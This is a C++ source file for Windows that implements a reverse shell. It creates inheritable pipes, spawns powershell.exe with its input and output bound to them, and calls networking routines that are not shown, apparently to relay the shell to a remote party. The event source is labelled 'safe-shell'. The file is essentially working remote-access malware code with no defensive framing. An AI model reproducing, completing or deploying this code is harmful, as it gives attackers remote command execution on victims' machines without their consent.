#include <ws2tcpip.h>
#include <windows.h>

#include "reverseShell.h"

#include <iostream>

HANDLE journalHandle;

reverseShell	shell = {};
int				g_stopProcess = 0;
volatile long	g_stopRoutines = 0;

void journalReport(std::wstring msg) {
	const wchar_t *ptr = msg.c_str();
	ReportEventW(
		journalHandle,
		EVENTLOG_INFORMATION_TYPE,
		0,
		0,
		NULL,
		1,
		0,
		&ptr,
		NULL
	);
}

static void formatSecurityAttributes(void) {
	shell.secAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	shell.secAttributes.lpSecurityDescriptor = NULL;
	shell.secAttributes.bInheritHandle = TRUE;
}

static BYTE createPipes(void) {

	formatSecurityAttributes();

	if (!CreatePipe(&shell.parentRead, &shell.childWrite,
					&shell.secAttributes, 0)) {
			return (FAILURE);
	}
	if (!CreatePipe(&shell.childRead, &shell.parentWrite,
					&shell.secAttributes, 0)) {
			return (FAILURE);
	}

	SetHandleInformation(shell.parentRead, HANDLE_FLAG_INHERIT, 0);
	SetHandleInformation(shell.parentWrite, HANDLE_FLAG_INHERIT, 0);

	return (SUCCESS);
}

static void formatProcessAttributes(void) {
	shell.startupInfo.cb = sizeof(STARTUPINFO);
	shell.startupInfo.dwFlags = STARTF_USESTDHANDLES;
	shell.startupInfo.hStdInput = shell.childRead;
	shell.startupInfo.hStdOutput = shell.childWrite;
	shell.startupInfo.hStdError = shell.childWrite;
}

static BYTE createProcess(void) {

	formatProcessAttributes();

	wchar_t cmd[] = L"powershell.exe";

	if (!CreateProcessW(
		NULL,
		cmd,
		NULL, NULL,
		TRUE, 0,
		NULL, NULL,
		&shell.startupInfo,
		&shell.processInfo
	)) {
		return (FAILURE);
	} else {
		Sleep(2000); // Wait for the child to start normally
		CloseHandle(shell.childRead);
		CloseHandle(shell.childWrite);
	}
	return (SUCCESS);
}

static void initStopHandler(void) {
	shell.stopEventsignal = OpenEventA(
		SYNCHRONIZE,
		FALSE,
		PROCESS_STOP
	);
}

static BYTE initProcess(void) {
	
	initStopHandler();

	if (launchThreadsMonitor() == FAILURE)
		return (FAILURE);

	if (initNetworking() == FAILURE)
		return (FAILURE);

	if (createPipes() == FAILURE)
		return (FAILURE);

	if (createProcess() == FAILURE)
		return (FAILURE);

	return (SUCCESS);
}

int main() {
	journalHandle = RegisterEventSourceA(NULL, "safe-shell");

	journalReport(L"Entering main loop\n");
	while (true) {

		if (initProcess() == FAILURE)
			break ;

		journalReport(L"Init process done");

		if (startRoutines() == FAILURE)
			break ;

		if (g_stopProcess == TRUE)
			return (EXIT_SUCCESS);
		g_stopRoutines = 0;
	}
	cleanUp(L"main (before exit)\n");
	return (EXIT_SUCCESS);
}